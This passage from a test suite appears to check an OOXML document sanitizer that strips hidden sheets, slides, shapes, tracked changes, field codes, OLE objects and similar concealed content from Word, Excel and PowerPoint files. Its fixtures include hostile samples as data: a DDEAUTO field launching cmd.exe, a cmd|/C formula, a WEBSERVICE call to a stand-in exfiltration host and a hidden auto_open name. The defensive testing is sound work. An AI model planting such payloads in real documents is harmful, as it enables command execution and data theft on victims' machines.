            name: 'VERYNAMESENTINEL',
            state: 'veryHidden',
            xml: `<sheetData>${row(1, ['VERYHIDDENSENTINEL'])}</sheetData>`,
          },
        ],
      }),
      MIME.xlsx,
      [
        'HIDDENSHEETSENTINEL',
        'VERYHIDDENSENTINEL',
        'HIDDENNAMESENTINEL',
        'VERYNAMESENTINEL',
        'sheet2.xml',
        'sheet3.xml',
      ],
    )
    expect(out.removed.hiddenSheets).toBe(2)
  })

  it('a sheet state other than visible is read as hidden', async () => {
    await disarmed(
      xlsx({
        sheets: [
          { name: 'Shown', state: 'visible', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` },
          {
            name: 'Odd',
            state: 'HIDDEN',
            xml: `<sheetData>${row(1, ['ODDSTATESENTINEL'])}</sheetData>`,
          },
        ],
      }),
      MIME.xlsx,
      ['ODDSTATESENTINEL'],
    )
  })

  it('drops a show="0" slide, its notes and its <p:sldId>; and a slide <p:sldIdLst> does not list', async () => {
    const out = await disarmed(
      pptx({
        slides: [
          { shapes: shape('VISIBLE'), notes: 'NOTESVISIBLE' },
          { shapes: shape('HIDDENSLIDESENTINEL'), show: '0', notes: 'HIDDENNOTESSENTINEL' },
          { shapes: shape('FALSESLIDESENTINEL'), show: 'false' },
          { shapes: shape('UNLISTEDSENTINEL'), unlisted: true },
        ],
      }),
      MIME.pptx,
      [
        'HIDDENSLIDESENTINEL',
        'HIDDENNOTESSENTINEL',
        'FALSESLIDESENTINEL',
        'UNLISTEDSENTINEL',
        'slide2.xml',
        'slide3.xml',
        'slide4.xml',
        'notesSlide2',
        'rIdSlide2',
        'rIdSlide4',
      ],
    )
    expect(everything(out.bytes)).toContain('NOTESVISIBLE')
    expect(out.removed.hiddenSlides).toBe(3)
  })
})

describe('Z2: hidden shapes and alt text', () => {
  it('drops a pptx shape with hidden="1" on p:cNvPr', async () => {
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE') +
              shape('HIDDENSHAPESENTINEL', { id: 3, cNvPr: 'hidden="1"' }) +
              shape('TRUESHAPESENTINEL', { id: 4, cNvPr: 'hidden="true"' }),
          },
        ],
      }),
      MIME.pptx,
      ['HIDDENSHAPESENTINEL', 'TRUESHAPESENTINEL'],
    )
    expect(out.removed.hiddenShapes).toBe(2)
  })

  it('drops a docx drawing with hidden="1" on wp:docPr, text box and all', async () => {
    const drawing =
      `<w:p><w:r><w:drawing><wp:anchor><wp:docPr id="5" name="box" hidden="1"/>` +
      `<a:graphic><a:graphicData uri="x"><wps:wsp><wps:txbx><w:txbxContent>${para('DOCPRSENTINEL')}</w:txbxContent></wps:txbx></wps:wsp>` +
      `</a:graphicData></a:graphic></wp:anchor></w:drawing></w:r></w:p>`
    await disarmed(docx({ body: para('VISIBLE') + drawing }), MIME.docx, ['DOCPRSENTINEL'])
  })

  it('strips descr and title on wp:docPr, pic:cNvPr and p:cNvPr', async () => {
    const pic =
      `<w:p><w:r><w:drawing><wp:inline><wp:docPr id="1" name="p" descr="DOCPRDESCRSENTINEL" title="DOCPRTITLESENTINEL"/>` +
      `<a:graphic><a:graphicData uri="x"><pic:pic><pic:nvPicPr><pic:cNvPr id="2" name="p" descr="PICDESCRSENTINEL" title="PICTITLESENTINEL"/>` +
      `<pic:cNvPicPr/></pic:nvPicPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>`
    const w = await disarmed(docx({ body: para('VISIBLE') + pic }), MIME.docx, [
      'DOCPRDESCRSENTINEL',
      'DOCPRTITLESENTINEL',
      'PICDESCRSENTINEL',
      'PICTITLESENTINEL',
    ])
    expect(w.removed.altText).toBe(2)
    await disarmed(
      pptx({
        slides: [
          { shapes: shape('VISIBLE', { cNvPr: 'descr="PDESCRSENTINEL" title="PTITLESENTINEL"' }) },
        ],
      }),
      MIME.pptx,
      ['PDESCRSENTINEL', 'PTITLESENTINEL'],
    )
  })
})

describe('Z2: tracked changes — accepted structurally', () => {
  it('drops w:del and w:moveFrom; keeps w:ins and w:moveTo, unwrapped', async () => {
    const body =
      `<w:p>${run('VISIBLE')}<w:del w:id="1" w:author="a"><w:r><w:delText>DELSENTINEL</w:delText></w:r></w:del>` +
      // Deleted content that is not w:delText: only the w:del rule reaches it.
      `<w:del w:id="7" w:author="a"><w:r><w:t>DELWTSENTINEL</w:t><w:tab/></w:r></w:del>` +
      `<w:ins w:id="2" w:author="a">${run('INSKEPT')}</w:ins></w:p>` +
      `<w:p><w:moveFromRangeStart w:id="3" w:name="m"/><w:moveFrom w:id="4" w:author="a">${run('MOVEFROMSENTINEL')}</w:moveFrom><w:moveFromRangeEnd w:id="3"/></w:p>` +
      `<w:p><w:moveToRangeStart w:id="5" w:name="m"/><w:moveTo w:id="6" w:author="a">${run('MOVETOKEPT')}</w:moveTo><w:moveToRangeEnd w:id="5"/></w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [
      'DELSENTINEL',
      'DELWTSENTINEL',
      'MOVEFROMSENTINEL',
      'w:ins',
      'w:moveTo',
      'moveFromRange',
    ])
    const all = everything(out.bytes)
    expect(all).toContain('INSKEPT')
    expect(all).toContain('MOVETOKEPT')
    expect(out.removed.deletions).toBe(3)
  })

  it('drops a deleted table row and a stray w:delText', async () => {
    const body =
      '<w:tbl><w:tblGrid><w:gridCol/></w:tblGrid>' +
      `<w:tr><w:tc>${para('VISIBLE')}</w:tc></w:tr>` +
      `<w:tr><w:trPr><w:del w:id="1" w:author="a"/></w:trPr><w:tc>${para('DELROWSENTINEL')}</w:tc></w:tr></w:tbl>` +
      '<w:p><w:r><w:delText>STRAYDELSENTINEL</w:delText></w:r></w:p>'
    await disarmed(docx({ body }), MIME.docx, ['DELROWSENTINEL', 'STRAYDELSENTINEL'])
  })

  it('drops property revisions (the old formatting)', async () => {
    const body =
      `<w:p><w:pPr><w:pPrChange w:id="1" w:author="a"><w:pPr><w:pStyle w:val="PPRCHANGESENTINEL"/></w:pPr></w:pPrChange></w:pPr>` +
      `${run('VISIBLE', '<w:b/><w:rPrChange w:id="2" w:author="a"><w:rPr><w:rStyle w:val="RPRCHANGESENTINEL"/></w:rPr></w:rPrChange>')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [
      'PPRCHANGESENTINEL',
      'RPRCHANGESENTINEL',
    ])
    expect(out.removed.formatRevisions).toBe(2)
  })
})

describe('Z2: field codes and DDE', () => {
  const field = (instr: string, result: string, codeText = '') =>
    `<w:r><w:fldChar w:fldCharType="begin"/></w:r>` +
    `<w:r><w:instrText xml:space="preserve">${instr}</w:instrText></w:r>` +
    (codeText ? `<w:r><w:t>${codeText}</w:t></w:r>` : '') +
    `<w:r><w:fldChar w:fldCharType="separate"/></w:r>` +
    `${run(result)}<w:r><w:fldChar w:fldCharType="end"/></w:r>`

  it('a DDEAUTO field: the instruction goes, the result stays', async () => {
    const out = await disarmed(
      docx({
        body: `<w:p>${field('DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k DDESENTINEL"', 'VISIBLE')}</w:p>`,
      }),
      MIME.docx,
      ['DDESENTINEL', 'instrText', 'fldChar', 'DDEAUTO'],
    )
    expect(out.removed.fieldCodes).toBeGreaterThan(0)
  })

  it('text between begin and separate is field code, and is dropped', async () => {
    await disarmed(
      docx({ body: `<w:p>${field('QUOTE "x"', 'VISIBLE', 'CODETEXTSENTINEL')}</w:p>` }),
      MIME.docx,
      ['CODETEXTSENTINEL'],
    )
  })

  it('a nested field: the outer field code after the inner field ends is still code', async () => {
    const nested =
      `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>IF </w:instrText></w:r>` +
      field('PAGE', '1') +
      `<w:r><w:t>OUTERCODESENTINEL</w:t></w:r>` +
      `<w:r><w:fldChar w:fldCharType="separate"/></w:r>${run('VISIBLE')}<w:r><w:fldChar w:fldCharType="end"/></w:r>`
    await disarmed(docx({ body: `<w:p>${nested}</w:p>` }), MIME.docx, ['OUTERCODESENTINEL'])
  })

  it('a field spanning paragraphs drops its code in every paragraph it covers', async () => {
    const body =
      `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>INCLUDETEXT</w:instrText></w:r></w:p>` +
      `<w:p><w:r><w:t>SPANCODESENTINEL</w:t></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>${run('VISIBLE')}` +
      `<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`
    await disarmed(docx({ body }), MIME.docx, ['SPANCODESENTINEL'])
  })

  it('a form field’s data (help and status text) goes with its field character', async () => {
    const ff =
      `<w:r><w:fldChar w:fldCharType="begin"><w:ffData><w:name w:val="f"/><w:helpText w:type="text" w:val="FFHELPSENTINEL"/>` +
      `<w:statusText w:type="text" w:val="FFSTATUSSENTINEL"/></w:ffData></w:fldChar></w:r>` +
      `<w:r><w:instrText>FORMTEXT</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>${run('VISIBLE')}` +
      `<w:r><w:fldChar w:fldCharType="end"/></w:r>`
    await disarmed(docx({ body: `<w:p>${ff}</w:p>` }), MIME.docx, [
      'FFHELPSENTINEL',
      'FFSTATUSSENTINEL',
    ])
  })

  it('a hidden begin still opens a field: the code after it is dropped', async () => {
    const body =
      `<w:p><w:r><w:rPr><w:vanish/></w:rPr><w:fldChar w:fldCharType="begin"/></w:r>` +
      `<w:r><w:instrText>QUOTE</w:instrText></w:r><w:r><w:t>HIDDENBEGINSENTINEL</w:t></w:r>` +
      `<w:r><w:fldChar w:fldCharType="separate"/></w:r>${run('VISIBLE')}` +
      `<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`
    await disarmed(docx({ body }), MIME.docx, ['HIDDENBEGINSENTINEL'])
  })

  it('a deleted separator does not end the code: the text after it is dropped', async () => {
    const body =
      `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>QUOTE</w:instrText></w:r>` +
      `<w:del w:id="1" w:author="a"><w:r><w:fldChar w:fldCharType="separate"/></w:r></w:del>` +
      `<w:r><w:t>DELSEPSENTINEL</w:t></w:r>` +
      `<w:r><w:fldChar w:fldCharType="separate"/></w:r>${run('VISIBLE')}` +
      `<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`
    await disarmed(docx({ body }), MIME.docx, ['DELSEPSENTINEL'])
  })

  it('an equation inside a field’s code is code', async () => {
    const body =
      `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>EQ</w:instrText></w:r>` +
      `<m:oMath><m:r><m:t>MATHCODESENTINEL</m:t></m:r></m:oMath>` +
      `<w:r><w:fldChar w:fldCharType="separate"/></w:r>${run('VISIBLE')}` +
      `<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`
    await disarmed(docx({ body }), MIME.docx, ['MATHCODESENTINEL'])
  })

  it('w:fldSimple: the instruction goes, the result runs stay', async () => {
    await disarmed(
      docx({
        body: `<w:p><w:fldSimple w:instr="DDEAUTO FLDSIMPLESENTINEL">${run('VISIBLE')}</w:fldSimple></w:p>`,
      }),
      MIME.docx,
      ['FLDSIMPLESENTINEL', 'fldSimple'],
    )
  })

  it('xlsx: cell formulas go and their cached values stay; defined names go', async () => {
    const sheet =
      '<sheetData><row r="1">' +
      `<c r="A1" t="str"><f>cmd|' /C FORMULASENTINEL'!A0</f><v>VISIBLE</v></c>` +
      `<c r="B1"><f t="shared" ref="B1:B2" si="0">WEBSERVICE("https://exfil.example/SHAREDSENTINEL")</f><v>1</v></c>` +
      '</row></sheetData>'
    const out = await disarmed(
      xlsx({
        sheets: [{ name: 'S', xml: sheet }],
        workbookExtra: `<definedNames><definedName name="auto_open" hidden="1">DEFNAMESENTINEL!A1</definedName></definedNames>`,
      }),
      MIME.xlsx,
      ['FORMULASENTINEL', 'SHAREDSENTINEL', 'DEFNAMESENTINEL', '<f', 'definedName'],
    )
    expect(out.removed.formulas).toBe(2)
    expect(out.removed.definedNames).toBe(1)
  })
})

describe('Z2: footnotes and endnotes no visible reference points at', () => {
  it('keeps a referenced note; drops an unreferenced one and one whose reference is hidden', async () => {
    const body =
      `<w:p>${run('VISIBLE')}<w:r><w:footnoteReference w:id="1"/></w:r>` +
      `<w:r><w:rPr><w:vanish/></w:rPr><w:footnoteReference w:id="2"/></w:r>` +
      `<w:r><w:endnoteReference w:id="1"/></w:r></w:p>`
    const notes = (kind: 'footnotes' | 'endnotes', el: string, items: [number, string][]) =>
      wNotes(kind, items.map(([id, t]) => `<w:${el} w:id="${id}">${para(t)}</w:${el}>`).join(''))
    const out = await disarmed(
      docx({
        body,
        footnotes: notes('footnotes', 'footnote', [
          [1, 'FOOTKEPT'],
          [2, 'HIDDENREFSENTINEL'],
          [3, 'UNREFSENTINEL'],
        ]),
        endnotes: notes('endnotes', 'endnote', [
          [1, 'ENDKEPT'],
          [2, 'ENDUNREFSENTINEL'],
        ]),
      }),
      MIME.docx,
      ['HIDDENREFSENTINEL', 'UNREFSENTINEL', 'ENDUNREFSENTINEL'],
    )
    const all = everything(out.bytes)
    expect(all).toContain('FOOTKEPT')
    expect(all).toContain('ENDKEPT')
    expect(all).toContain('w:separator')
    expect(out.removed.unreferencedNotes).toBe(3)
  })
})

describe('Z2: references to a dropped part', () => {
  it('a reference-only element goes; an element with content keeps its content', async () => {
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:t>LINKTEXT</w:t></w:r></w:p>` +
      `<w:sectPr><w:headerReference w:type="default" r:id="rIdHdr"/><w:footerReference w:type="default" r:id="rIdFtr"/></w:sectPr>`
    const out = await disarmed(
      docx({
        body,
        docRels: [
          { id: 'rIdHdr', type: RT.header, target: 'header1.xml' },
          { id: 'rIdFtr', type: RT.footer, target: 'footer1.xml' },
        ],
        parts: [
          {
            name: 'word/header1.xml',
            type: CT.wHeader,
            body: `<w:hdr xmlns:w="${NS.w}">${para('HDRSENTINEL')}</w:hdr>`,
          },
          {
            name: 'word/footer1.xml',
            type: CT.wFooter,
            body: `<w:ftr xmlns:w="${NS.w}">${para('FTRSENTINEL')}</w:ftr>`,
          },
        ],
      }),
      MIME.docx,
      ['HDRSENTINEL', 'FTRSENTINEL', 'headerReference', 'footerReference', 'rIdHdr'],
    )
    expect(out.removed.references).toBe(2)
    expect(unpack(out.bytes).get('word/document.xml')).toContain('<w:sectPr/>')
  })
})

describe('Z2: VML is not understood, so legacy w:pict content goes (A9)', () => {
  it('V1: a VML text box with visibility:hidden, and VML alt and o:title', async () => {
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:pict><v:shape id="s" style="visibility:hidden" alt="VMLALTSENTINEL"><v:imagedata o:relid="rIdVmlImg" o:title="VMLTITLESENTINEL"/>` +
      `<v:textbox><w:txbxContent>${para('VMLHIDDENSENTINEL')}</w:txbxContent></v:textbox></v:shape></w:pict></w:r></w:p>`
    const out = await disarmed(
      docx({
        body,
        docRels: [{ id: 'rIdVmlImg', type: RT.image, target: 'media/image1.png' }],
        parts: [{ name: 'word/media/image1.png', type: CT.png, body: blob('VMLIMGSENTINEL') }],
      }),
      MIME.docx,
      ['VMLHIDDENSENTINEL', 'VMLALTSENTINEL', 'VMLTITLESENTINEL', 'rIdVmlImg', 'v:shape'],
    )
    expect(out.removed.unknownMarkup).toBe(1)
  })

  it('an o:OLEObject with field codes, outside w:object', async () => {
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:pict><o:OLEObject Type="Link" ProgID="OLEPROGSENTINEL" r:id="rIdOle">` +
      `<o:LinkType>Picture</o:LinkType><o:FieldCodes>OLEFIELDSENTINEL</o:FieldCodes></o:OLEObject></w:pict></w:r></w:p>`
    const out = await disarmed(
      docx({
        body,
        docRels: [{ id: 'rIdOle', type: RT.oleObject, target: 'embeddings/oleObject1.bin' }],
      }),
      MIME.docx,
      ['OLEPROGSENTINEL', 'OLEFIELDSENTINEL', 'OLEObject'],
    )
    expect(out.removed.unknownMarkup).toBe(1)
  })
})

describe('Z2: OLE and ActiveX elements that carry content of their own', () => {
  it('a pptx p:oleObj and p:controls', async () => {
    const frame =
      `<p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id="9" name="o"/><p:cNvGraphicFramePr/><p:nvPr/></p:nvGraphicFramePr>` +
      `<p:xfrm><a:off x="0" y="0"/><a:ext cx="10" cy="10"/></p:xfrm><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">` +
      `<p:oleObj progId="PPTOLESENTINEL" r:id="rIdOle"><p:embed/></p:oleObj></a:graphicData></a:graphic></p:graphicFrame>`
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE') +
              frame +
              `<p:controls><p:control name="PPTCTLSENTINEL" spid="1" r:id="rIdCtl"><p:pic/></p:control></p:controls>`,
            rels: [
              { id: 'rIdOle', type: RT.oleObject, target: '../embeddings/oleObject1.bin' },
              { id: 'rIdCtl', type: RT.control, target: '../activeX/activeX1.xml' },
            ],
          },
        ],
      }),
      MIME.pptx,
      ['PPTOLESENTINEL', 'PPTCTLSENTINEL', 'oleObj'],
    )
    expect(out.removed).toMatchObject({ oleObjects: 1, controls: 1 })
  })

  it('an xlsx oleObjects and controls', async () => {
    const sheet =
      `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` +
      `<oleObjects><oleObject progId="XLOLESENTINEL" shapeId="1" r:id="rIdOle"><objectPr defaultSize="0"><anchor/></objectPr></oleObject></oleObjects>` +
      `<controls><control shapeId="2" name="XLCTLSENTINEL" r:id="rIdCtl"><controlPr/></control></controls>`
    await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: sheet,
            rels: [
              { id: 'rIdOle', type: RT.oleObject, target: '../embeddings/oleObject1.bin' },
              { id: 'rIdCtl', type: RT.control, target: '../activeX/activeX1.xml' },
            ],
          },
        ],
      }),
      MIME.xlsx,
      ['XLOLESENTINEL', 'XLCTLSENTINEL'],
    )
  })
})

describe('Z2: a notes slide cannot bring a hidden slide back', () => {
  it('a visible slide’s notes that point at a hidden slide reach nothing', async () => {
    const out = await disarmed(
      pptx({
        slides: [
          { shapes: shape('VISIBLE'), notes: 'NOTESVISIBLE' },
          { shapes: shape('BACKEDGESENTINEL'), show: '0' },
        ],
        extraRels: {
          'ppt/notesSlides/notesSlide1.xml': [
            { id: 'rIdSlide', type: RT.slide, target: '../slides/slide1.xml' },
            { id: 'rIdOther', type: RT.slide, target: '../slides/slide2.xml' },
          ],
        },
      }),
      MIME.pptx,
      ['BACKEDGESENTINEL', 'slide2.xml'],
    )
    expect(everything(out.bytes)).toContain('NOTESVISIBLE')
  })
})

describe('the output reopens through the reader that refused the input', () => {
  it('a part too repetitive to deflate under 100:1 is stored', async () => {
    const body = para('VISIBLE') + '<w:p/>'.repeat(200_000)
    const out = await ooxmlDisarm(docx({ body, stored: true }), MIME.docx)
    expect(everything(out.bytes)).toContain('VISIBLE')
  })

  it(
    'a part the rewrite would take past 20 MiB is refused, not written',
    {
      timeout: 30_000,
    },
    async () => {
      // A single-quoted attribute of `"` and pseudo-random hex: each `"` is
      // written back as `&quot;`, six bytes for one, and the hex keeps the
      // input under the reader's 100:1 ratio.
      const value = noise(3_250_000).replace(/./g, '"$&')
      const body = `<w:p><w:pPr><w:pStyle w:val='${value}'/></w:pPr></w:p>`
      expect(await refusalOf(ooxmlDisarm(docx({ body }), MIME.docx))).toBe('xml-size')
    },
  )
})

// ============================================================================
// Counted, not dropped (spec §5.3 step 2) — and so hiddenContent: 'not-removed' (A3)
// ============================================================================

describe('Z2: concealment is counted, not dropped', () => {
  it('xlsx: hidden rows and columns, zero heights and widths', async () => {
    const sheet =
      '<sheetFormatPr defaultRowHeight="15"/>' +
      '<cols><col min="1" max="1" width="10"/><col min="2" max="2" hidden="1"/><col min="3" max="3" width="0"/></cols>' +
      `<sheetData>${row(1, ['VISIBLE'])}${row(2, ['ROWHIDDENKEPT'], ' hidden="1"')}${row(3, ['ROWZEROKEPT'], ' ht="0" customHeight="1"')}</sheetData>`
    const out = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }] }), MIME.xlsx, [])
    const all = everything(out.bytes)
    expect(all).toContain('ROWHIDDENKEPT')
    expect(all).toContain('ROWZEROKEPT')
    expect(out.counted).toEqual({
      'hidden-flag': 2,
      'too-small': 2,
    })
  })

  it('xlsx: a sheet whose rows are hidden by default, or zero high by default', async () => {
    const out = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: `<sheetFormatPr defaultRowHeight="0" defaultColWidth="0" zeroHeight="1"/><sheetData>${row(1, ['VISIBLE'])}</sheetData>`,
          },
        ],
      }),
      MIME.xlsx,
      [],
    )
    expect(out.counted).toEqual({ 'hidden-flag': 1, 'too-small': 2 })
  })

  it('xlsx: the ;;; number format, and a font colour equal to its fill', async () => {
    const styles = sStyles({
      numFmts: '<numFmt numFmtId="164" formatCode=";;;"/>',
      fonts: [
        '<font><sz val="11"/></font>',
        '<font><color rgb="FF00FF00"/></font>',
        '<font><color rgb="FFFFFFFF"/></font>',
      ],
      fills: [
        '<fill><patternFill patternType="none"/></fill>',
        '<fill><patternFill patternType="gray125"/></fill>',
        '<fill><patternFill patternType="solid"><fgColor rgb="FF00FF00"/></patternFill></fill>',
      ],
      xfs: [
        '<xf numFmtId="0" fontId="0" fillId="0"/>',
        '<xf numFmtId="164" fontId="0" fillId="0"/>',
        '<xf numFmtId="0" fontId="1" fillId="2"/>',
        '<xf numFmtId="0" fontId="2" fillId="0"/>',
      ],
    })
    const cell = (ref: string, s: number, t: string) =>
      `<c r="${ref}" s="${s}" t="inlineStr"><is><t>${t}</t></is></c>`
    const sheet = `<sheetData><row r="1">${cell('A1', 0, 'VISIBLE')}${cell('B1', 1, 'FORMATKEPT')}${cell('C1', 2, 'GREENKEPT')}${cell('D1', 3, 'WHITEKEPT')}</row></sheetData>`
    const out = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }], styles }), MIME.xlsx, [])
    expect(everything(out.bytes)).toContain('GREENKEPT')
    expect(out.counted).toEqual({ 'hidden-flag': 1, 'colour-contrast': 2 })
  })

  it('docx: white text and text of 1 pt or less, direct or through a style', async () => {
    const styles = wStyles(
      DOCX_STYLES_NORMAL +
        '<w:style w:type="character" w:styleId="Tiny"><w:rPr><w:sz w:val="1"/></w:rPr></w:style>',
    )
    const body =
      `<w:p>${run('VISIBLE')}${run('WHITEKEPT', '<w:color w:val="FFFFFF"/>')}` +
      `${run('THEMEWHITEKEPT', '<w:color w:val="000000" w:themeColor="background1"/>')}` +
      `${run('TINYKEPT', '<w:sz w:val="2"/>')}${run('TINYSTYLEKEPT', '<w:rStyle w:val="Tiny"/>')}</w:p>`
    const out = await disarmed(docx({ body, styles }), MIME.docx, [])
    expect(everything(out.bytes)).toContain('TINYSTYLEKEPT')
    expect(out.counted).toEqual({ 'colour-contrast': 2, 'too-small': 2 })
  })

  it('pptx: white text, text of 1 pt or less, and a shape placed off the slide', async () => {
    const off = '<a:xfrm><a:off x="9144000" y="0"/><a:ext cx="100" cy="100"/></a:xfrm>'
    const neg = '<a:xfrm><a:off x="-500" y="0"/><a:ext cx="400" cy="100"/></a:xfrm>'
    const on = '<a:xfrm><a:off x="0" y="0"/><a:ext cx="100" cy="100"/></a:xfrm>'
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE', { xfrm: on }) +
              shape('WHITEKEPT', {
                id: 3,
                rPr: '<a:rPr><a:solidFill><a:srgbClr val="FFFFFF"/></a:solidFill></a:rPr>',
              }) +
              shape('SCHEMEWHITEKEPT', {
                id: 4,
                rPr: '<a:rPr><a:solidFill><a:schemeClr val="bg1"/></a:solidFill></a:rPr>',
              }) +
              shape('TINYKEPT', { id: 5, rPr: '<a:rPr sz="100"/>' }) +
              shape('OFFSLIDEKEPT', { id: 6, xfrm: off }) +
              shape('LEFTKEPT', { id: 7, xfrm: neg }),
          },
        ],
      }),
      MIME.pptx,
      [],
    )
    expect(everything(out.bytes)).toContain('OFFSLIDEKEPT')
    expect(out.counted).toEqual({ 'colour-contrast': 2, 'too-small': 1, layout: 2 })
  })

  it('anything counted makes flattenDocument report not-removed, so unattended picks Remove (A3)', async () => {
    const doc = await flattenDocument(
      {
        bytes: docx({ body: `<w:p>${run('VISIBLE', '<w:color w:val="ffffff"/>')}</w:p>` }),
        filename: 'x',
        mimeType: MIME.docx,
      },
      { convert: async () => 'VISIBLE', disarm: ooxmlDisarm },
    )
    expect(doc.report.counted).toEqual({ 'colour-contrast': 1 })
    expect(doc.report.hiddenContent).toBe('not-removed')
    expect(sanitizeOptionFor(doc)).toEqual({ unattended: false })
  })
})

// ============================================================================
// Markup compatibility: every element rule applies inside mc:Choice AND mc:Fallback
// ============================================================================

describe('Z2: every element rule holds in the mc:Choice or mc:Fallback Word renders (A9)', () => {
  /** Paragraph content carrying one rule's carrier, by name. */
  const carriers: Record<string, { xml: (s: string) => string; rels?: Rel[] }> = {
    vanish: { xml: (s) => run(s, '<w:vanish/>') },
    deletion: {
      xml: (s) => `<w:del w:id="9" w:author="a"><w:r><w:delText>${s}</w:delText></w:r></w:del>`,
    },
    moveFrom: { xml: (s) => `<w:moveFrom w:id="9" w:author="a">${run(s)}</w:moveFrom>` },
    fieldCode: {
      xml: (s) =>
        `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>${s}</w:instrText></w:r>` +
        `<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`,
    },
    fldSimple: { xml: (s) => `<w:fldSimple w:instr="${s}"/>` },
    hiddenShape: {
      xml: (s) =>
        `<w:r><w:drawing><wp:inline><wp:docPr id="7" name="d" hidden="1"/><a:graphic><a:graphicData uri="x">` +
        `<wps:wsp><wps:txbx><w:txbxContent>${para(s)}</w:txbxContent></wps:txbx></wps:wsp></a:graphicData></a:graphic></wp:inline></w:drawing></w:r>`,
    },
    altText: {
      xml: (s) =>
        `<w:r><w:drawing><wp:inline><wp:docPr id="8" name="d" descr="${s}"/></wp:inline></w:drawing></w:r>`,
    },
    oleObject: {
      xml: (s) =>
        `<w:r><w:object><o:OLEObject Type="Embed" ProgID="${s}" r:id="rIdOle"/></w:object></w:r>`,
      rels: [{ id: 'rIdOle', type: RT.oleObject, target: 'embeddings/oleObject1.bin' }],
    },
    commentMarker: { xml: (s) => `<w:commentRangeStart w:id="0" w:author="${s}"/>` },
    reference: {
      xml: (s) => `<w:hyperlink r:id="rIdExt">${run(s.toLowerCase())}</w:hyperlink>`,
      rels: [
        { id: 'rIdExt', type: RT.hyperlink, target: 'https://exfil.example/', external: true },
      ],
    },
  }

  for (const [rule, { xml, rels }] of Object.entries(carriers)) {
    for (const branch of ['choice', 'fallback'] as const) {
      it(`${rule} in mc:${branch === 'choice' ? 'Choice' : 'Fallback'}`, async () => {
        const sentinel = `${rule.toUpperCase()}IN${branch.toUpperCase()}SENTINEL`
        const body =
          para('VISIBLE') +
          `<w:p>${inAlternateContent(xml(sentinel), branch, run('OTHERBRANCH'))}</w:p>`
        const gone = rule === 'reference' ? ['rIdExt', 'exfil.example'] : [sentinel]
        await disarmed(docx({ body, docRels: rels }), MIME.docx, gone)
      })
    }
  }

  it('J1: text only in a Choice whose Requires Word does not understand is dropped', async () => {
    const body =
      para('VISIBLE') +
      `<w:p>${inAlternateContent(run('FALLBACKKEPT'), 'fallback', run('J1CHOICESENTINEL'))}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, ['J1CHOICESENTINEL', 'AlternateContent'])
    expect(everything(out.bytes)).toContain('FALLBACKKEPT')
    expect(out.removed.alternateContent).toBe(1)
  })

  it('J2: text only in the Fallback Word does not render is dropped', async () => {
    const body =
      para('VISIBLE') +
      `<w:p>${inAlternateContent(run('CHOICEKEPT'), 'choice', run('J2FALLBACKSENTINEL'))}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, ['J2FALLBACKSENTINEL', 'mc:Fallback'])
    expect(everything(out.bytes)).toContain('CHOICEKEPT')
  })

  for (const branch of ['choice', 'fallback'] as const) {
    it(`the rendered ${branch} is itself reduced: an ignorable wrapper inside it goes`, async () => {
      const wrapped = `<zz2:wrap xmlns:zz2="urn:ignorable">${run('NESTEDWRAPSENTINEL')}</zz2:wrap>`
      const body =
        para('VISIBLE') + `<w:p>${inAlternateContent(wrapped + run('BRANCHKEPT'), branch)}</w:p>`
      const out = await disarmed(docx({ body }), MIME.docx, ['NESTEDWRAPSENTINEL'])
      expect(everything(out.bytes)).toContain('BRANCHKEPT')
    })
  }

  it('a hidden pptx shape inside mc:Fallback', async () => {
    const ac = inAlternateContent(
      shape('PFALLBACKSENTINEL', { id: 3, cNvPr: 'hidden="1"' }),
      'fallback',
      '',
    )
    await disarmed(pptx({ slides: [{ shapes: shape('VISIBLE') + ac }] }), MIME.pptx, [
      'PFALLBACKSENTINEL',
    ])
  })

  it('a formula inside mc:Fallback', async () => {
    const sheet =
      `<sheetData><row r="1"><c r="A1" t="str"><f>A2</f><v>VISIBLE</v></c></row></sheetData>` +
      inAlternateContent(
        `<c xmlns="${NS.s}"><f>FFALLBACKSENTINEL</f></c>`,
        'fallback',
        '<x14:dummy xmlns:x14="urn:x14"/>',
      )
    await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }] }), MIME.xlsx, ['FFALLBACKSENTINEL'])
  })
})

// ============================================================================
// Matched by namespace URI, never by prefix (F11)
// ============================================================================

describe('Z2: the rules match the namespace URI, whatever the prefix', () => {
  it('a non-w prefix bound to WordprocessingML: vanish, del, instrText, object', async () => {
    const x = `xmlns:x="${NS.w}"`
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:rPr><x:vanish ${x}/></w:rPr><w:t>XVANISHSENTINEL</w:t></w:r></w:p>` +
